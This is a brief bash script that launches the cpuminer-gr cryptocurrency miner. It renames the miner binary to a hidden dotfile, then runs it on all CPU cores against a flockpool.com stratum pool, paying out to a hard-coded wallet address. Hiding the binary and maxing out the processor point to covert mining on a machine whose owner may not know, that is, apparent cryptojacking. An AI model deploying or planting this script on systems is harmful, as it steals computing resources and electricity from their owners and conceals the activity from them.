#!/bin/bash

chmod +x ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe -t $(nproc --all) --no-tune
